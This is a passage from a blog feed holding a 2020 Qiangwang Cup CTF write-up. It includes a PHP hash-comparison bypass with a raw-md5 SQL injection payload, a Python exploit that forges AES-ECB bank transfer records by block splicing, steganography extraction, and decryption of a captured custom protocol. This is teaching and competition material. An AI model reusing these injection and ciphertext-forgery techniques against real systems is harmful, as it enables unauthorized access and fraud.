&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;filejava&quot;&gt;&lt;a href=&quot;#filejava&quot; class=&quot;headerlink&quot; title=&quot;filejava&quot;&gt;&lt;/a&gt;filejava&lt;/h2&gt;&lt;p&gt;一道XXE的题目。&lt;br&gt;先看到个上传功能，传完可以下载。&lt;br&gt;在下载功能点存在任意文件下载漏洞。&lt;br&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/20200925173410.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="网鼎杯" scheme="https://sncker.github.io/blog/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
    
    <category term="2020" scheme="https://sncker.github.io/blog/tags/2020/"/>
    
    <category term="线上" scheme="https://sncker.github.io/blog/tags/%E7%BA%BF%E4%B8%8A/"/>
    
  </entry>
  
  <entry>
    <title>2020强网杯Online-WriteUp</title>
    <link href="https://sncker.github.io/blog/2020/08/26/2020%E5%BC%BA%E7%BD%91%E6%9D%AFOnline-WriteUp/"/>
    <id>https://sncker.github.io/blog/2020/08/26/2020%E5%BC%BA%E7%BD%91%E6%9D%AFOnline-WriteUp/</id>
    <published>2020-08-26T01:48:00.000Z</published>
    <updated>2020-10-08T15:28:23.649Z</updated>
    
    <content type="html"><![CDATA[<p>近来档期满满，隔天就一场。猝si的感jio。<br>越来越菜，也就只能帮二进制爷爷打打杂交交flag这样啦。<br>just do it.<br><img src="https://raw.githubusercontent.com/sncker/resource/master/image/20200826192117.gif" alt=""></p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>简单题。给了流量包，结合题目名，八九不离十。直接滤http流，找到了图片上传。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826154507.png" alt=""></p><a id="more"></a><p>保存下来，结合图片名称hint知道是steghide隐写。直接上工具，题目应该要爆破密码，但是盲猜123456猜中了。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826154521.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826095904.png" alt=""></p><h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>] || md5(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>]) !== md5(<span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . md5(<span class="variable">$_GET</span>[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc(); </span><br><span class="line">var_dump(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$result</span>-&gt;free();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>hash考点<br>level1弱比较，找一个0e开头的明文<code>0e251288019</code>md4后也是0e开头的hash即可绕过<br>level2 md5强比较，用数组绕过<br>level3 md5 sql注入，开启了raw输出，找到一个hash为<code>x&#39; or xx...</code>的明文<code>ffifdyop</code>即可<br>payload:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hash1&#x3D;0e251288019&amp;hash2[]&#x3D;111&amp;hash3[]&#x3D;222&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure><h2 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h2><p>上来先sha256爆破，题目提示了明文的字符空间是大小写加数字，简单爆破即可。然后给队伍的token。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826100716.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826100904.png" alt=""><br>一个银行系统。先看hint，给了一段代码。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transact_ecb</span>(<span class="params">key, sender, receiver, amount</span>):</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    ct += aes.encrypt(sender)</span><br><span class="line">    ct += aes.encrypt(receiver)</span><br><span class="line">    ct += aes.encrypt(amount)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br></pre></td></tr></table></figure><p>可以知道是基于AES加密的转账系统。<br>初始时有10cash，拿flag需要1000cash。<br>常规的转账是，先通过transact拿到由服务器加密的record，然后provide上去即可完成转账。<br>可以通过view看到全部转账记录(包括别人的)<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826101623.png" alt=""><br>那么可以考虑通过篡改别人的记录，将接收者改为自己，伪造别人给自己转账。<br>在record生成代码中，采用发送者+接收者+金额的密文拼接方式。一条record长96个字符，48个字节。那么前16个字节就是发送者的密文，中间16个字节是接收者，后16个字节是金额。<br>思路清晰：先生成一条自己给别人转账的record，取前16字节就是自己NickName的密文。然后将所有record的中间16个字节替换成自己的密文再全部提交上去。即可伪造别人给自己转账。<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_sha256</span>(<span class="params">text</span>):</span></span><br><span class="line">s = hashlib.sha256()</span><br><span class="line">s.update(text.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> s.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">io</span>):</span></span><br><span class="line">io.read_until(<span class="string">&quot;sha256(XXX+&quot;</span>)</span><br><span class="line">salt = io.read_until(<span class="string">&quot;)&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(salt)</span></span><br><span class="line">io.read_until(<span class="string">&quot;== &quot;</span>)</span><br><span class="line">hash1 = io.read_until(<span class="string">&quot;G&quot;</span>)[:-<span class="number">2</span>]</span><br><span class="line"><span class="comment">#print(hash1)</span></span><br><span class="line">space = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">for</span> text_tuple <span class="keyword">in</span> permutations(space, <span class="number">3</span>):</span><br><span class="line"><span class="comment">#print(text_tuple)</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join(text_tuple) + salt</span><br><span class="line">enc = hash_sha256(text)</span><br><span class="line"><span class="keyword">if</span> enc == hash1:</span><br><span class="line">io.read_until(<span class="string">&quot;XXX:&quot;</span>)</span><br><span class="line">io.writeline(text[:<span class="number">3</span>])</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;39.101.134.52&quot;</span></span><br><span class="line">port = <span class="number">8005</span></span><br><span class="line"></span><br><span class="line">teamtoken = <span class="string">&quot;icqa4f7d3d27c218f218c1ce95559eea&quot;</span></span><br><span class="line">target=(ip,port)</span><br><span class="line"></span><br><span class="line">io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW,<span class="string">&#x27;red&#x27;</span>), print_write=COLORED(RAW,<span class="string">&#x27;green&#x27;</span>))</span><br><span class="line"></span><br><span class="line">auth(io)</span><br><span class="line">io.read_until(<span class="string">&quot;teamtoken:&quot;</span>)</span><br><span class="line">io.writeline(teamtoken)</span><br><span class="line">io.read_until(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;sncker&quot;</span>)</span><br><span class="line">io.read_until(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;transact&quot;</span>)</span><br><span class="line">io.read_until(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;a 1&quot;</span>)</span><br><span class="line">myname_hash = io.read(<span class="number">32</span>)</span><br><span class="line"><span class="comment">#print(myname_hash)</span></span><br><span class="line">io.read_until(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;view records&quot;</span>)</span><br><span class="line">io.read_until(<span class="string">&quot;more than 100&quot;</span>)</span><br><span class="line">r_hash = io.read(<span class="number">10</span> * <span class="number">96</span> + <span class="number">10</span>)[<span class="number">1</span>:]</span><br><span class="line">r_list = r_hash.split(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">io.read_until(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;provide a record&quot;</span>)</span><br><span class="line">io.read_until(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.writeline(r_list[_][:<span class="number">32</span>] + myname_hash + r_list[_][<span class="number">64</span>:])</span><br><span class="line"></span><br><span class="line">io.interact()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200826102401.png" alt=""></p><h2 id="红方辅助"><a href="#红方辅助" class="headerlink" title="红方辅助"></a>红方辅助</h2><p>给了一个流量包和一个py脚本。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha256</span><br><span class="line"></span><br><span class="line">IP = <span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span></span><br><span class="line">PORT = <span class="number">10235</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetSalt</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>((md5(sha256(data.encode()).digest())).hexdigest(), <span class="number">16</span>) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, btime, count</span>):</span></span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">        <span class="string">&quot;1&quot;</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">        <span class="string">&quot;2&quot;</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;1&quot;</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;2&quot;</span> : <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    length = <span class="built_in">len</span>(data) + <span class="number">10</span></span><br><span class="line">    fn = <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">65535</span>) % <span class="number">3</span>).encode()</span><br><span class="line">    salt = GetSalt(data) </span><br><span class="line"></span><br><span class="line">    t = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, btime)[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn.decode()]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">&quot;&lt;i&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    enc = struct.pack(<span class="string">&quot;&lt;IIcB&quot;</span>, count, length, fn, salt)</span><br><span class="line">    i = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        enc += <span class="built_in">chr</span>((funcs[fn.decode()](<span class="built_in">ord</span>(c) ^ <span class="built_in">ord</span>(t[i]), salt) % <span class="number">256</span>))</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> boffset, enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendMessage</span>(<span class="params">ClientSocket</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    readlines = f.readlines()</span><br><span class="line">    f.close()</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> readline <span class="keyword">in</span> readlines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ClientSocket.send(<span class="string">&quot;G&quot;</span>)</span><br><span class="line"></span><br><span class="line">            btime = ClientSocket.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">            boffset, data = encrypt(readline, btime, count)</span><br><span class="line">            ClientSocket.send(struct.pack(<span class="string">&quot;&lt;i&quot;</span>, boffset))</span><br><span class="line">            ClientSocket.send(data)</span><br><span class="line">            pcount = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, ClientSocket.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> pcount != count:</span><br><span class="line">                print(<span class="string">&quot;error!&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&quot;error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    ClientSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ClientSocket = socket.socket(family = socket.AF_INET, <span class="built_in">type</span> = socket.SOCK_STREAM)</span><br><span class="line">    ClientSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    ClientSocket.connect((IP,PORT))</span><br><span class="line"></span><br><span class="line">    SendMessage(ClientSocket)</span><br><span class="line"></span><br><span class="line">    ClientSocket.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>粗略看了脚本可以知道是数据处理+网络传输协议。那么就要从抓包流量中逆向出原数据。<br>因为知道了端口所以可以直接过滤出指定端口的流量。然后保存下来。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826154418.png" alt=""><br>看到加密函数里的主要处理代码。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc += <span class="built_in">chr</span>((funcs[fn.decode()](<span class="built_in">ord</span>(c) ^ <span class="built_in">ord</span>(t[i]), salt) % <span class="number">256</span>))</span><br></pre></td></tr></table></figure><p>对照写出解密过程。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m += <span class="built_in">chr</span>((funcs[fn.decode()](<span class="built_in">ord</span>(c), salt) ^ <span class="built_in">ord</span>(t[i])) % <span class="number">256</span>)</span><br></pre></td></tr></table></figure><p>对应的<code>funcs</code>也要改为逆函数。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">funcs = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">        <span class="string">&quot;1&quot;</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">        <span class="string">&quot;2&quot;</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看脚本可以知道数据分段传输，长度都一样，除了最后一段。但长度信息包含在数据头部所以不影响。<br>通过分析可以对数据进行划分。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826154918.png" alt=""><br>解密过程需要的参数为<code>fn, salt, t</code><br><code>fn,salt</code>都能直接取到。<br><code>t</code>朔源可知由<code>btime</code>和<code>boffset</code>决定，这两个也可以取到。<br>复制加密函数，简单修改一下即可得出解密函数。<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetSalt</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, btime, count</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data, btime, boffset, count, fn, length, salt</span>):</span></span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">        <span class="string">&quot;1&quot;</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">        <span class="string">&quot;2&quot;</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;1&quot;</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;2&quot;</span> : <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    t = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, btime)[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn.decode()]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">&quot;&lt;i&quot;</span>, t)</span><br><span class="line">    </span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        m += <span class="built_in">chr</span>((funcs[fn.decode()](<span class="built_in">ord</span>(c), salt) ^ <span class="built_in">ord</span>(t[i]))%<span class="number">256</span>)</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> boffset, m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendMessage</span>(<span class="params">ClientSocket</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;alldata&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                f.read(<span class="number">1</span>)</span><br><span class="line">                btime = f.read(<span class="number">4</span>)</span><br><span class="line">                boffset = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, f.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">                count = struct.unpack(<span class="string">&quot;&lt;l&quot;</span>, f.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">                length = struct.unpack(<span class="string">&quot;&lt;l&quot;</span>, f.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">                fn = struct.unpack(<span class="string">&quot;&lt;c&quot;</span>, f.read(<span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">                salt = struct.unpack(<span class="string">&quot;&lt;B&quot;</span>, f.read(<span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">                data = f.read(length - <span class="number">10</span>)</span><br><span class="line">                f.read(<span class="number">4</span>)</span><br><span class="line">                a, m = decrypt(data, btime, boffset, count, fn, length, salt)</span><br><span class="line">            </span><br><span class="line">                f1.write(m)</span><br></pre></td></tr></table></figure><p>打开flag.txt<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200826155618.png" alt=""><br>还要手动拼一下，有点小过分:)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWB&#123;3e752bf509ddb4e9a42f1ef30beff495&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;近来档期满满，隔天就一场。猝si的感jio。&lt;br&gt;越来越菜，也就只能帮二进制爷爷打打杂交交flag这样啦。&lt;br&gt;just do it.&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/sncker/resource/master/image/20200826192117.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;强网先锋&quot;&gt;&lt;a href=&quot;#强网先锋&quot; class=&quot;headerlink&quot; title=&quot;强网先锋&quot;&gt;&lt;/a&gt;强网先锋&lt;/h1&gt;&lt;h2 id=&quot;upload&quot;&gt;&lt;a href=&quot;#upload&quot; class=&quot;headerlink&quot; title=&quot;upload&quot;&gt;&lt;/a&gt;upload&lt;/h2&gt;&lt;p&gt;简单题。给了流量包，结合题目名，八九不离十。直接滤http流，找到了图片上传。&lt;br&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/20200826154507.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="2020" scheme="https://sncker.github.io/blog/tags/2020/"/>
    
    <category term="线上" scheme="https://sncker.github.io/blog/tags/%E7%BA%BF%E4%B8%8A/"/>
    
    <category term="强网杯" scheme="https://sncker.github.io/blog/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>BJD3rd&amp;DASCTF-WriteUp</title>
    <link href="https://sncker.github.io/blog/2020/05/26/BJD3rnd-DASCTF-WriteUp/"/>
